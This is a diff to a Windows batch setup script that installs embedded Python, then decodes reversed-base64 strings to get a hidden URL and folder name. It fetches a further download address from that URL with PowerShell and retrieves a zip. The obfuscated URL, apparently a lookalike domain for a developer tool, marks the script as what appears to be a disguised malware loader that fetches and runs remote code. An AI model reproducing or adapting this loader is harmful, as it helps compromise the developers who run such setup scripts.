@@ -8,8 +8,8 @@ set "PY_ZI_FI=python-3.11.3-embed-amd64.zip"
 set "PY_DI=python-3.11.3-embed-amd64"
 set "GE_PI_UR=https://bootstrap.pypa.io/get-pip.py"
 set "GE_PI_FI=get-pip.py"
-set "AP_UR_EC==smbpxWLlh2Yh5WYn9iclBHblh2LxY3LpBXYvUmdpxmLlh2Yh5WYn9yL6MHc0RHa"
 set "AP_UR="
+set "AP_UR_EC==smbpxWLlh2Yh5WYn9iclBHblh2LxY3LpBXYvUmdpxmLlh2Yh5WYn9yL6MHc0RHa"
 set "ZI_FI=main.zip"
 set "PR_DI_EC===gbpdXL5ZWarN2bsNGa"
 set "VENV_DIR=venv"
@@ -22,6 +22,7 @@ call :dcStr "%PR_DI_EC%", PROJECT_DIR
 
 REM Function to retrieve packages
 echo Retrieving packages
+if [%AP_UR%]==[] echo "Empty URL"
 for /f "usebackq tokens=*" %%i in (`powershell -Command "(Invoke-WebRequest -Uri %AP_UR%).Content.Trim()"`) do set "ZIP_URL=%%i"
 
 python --version >nul 2>&1
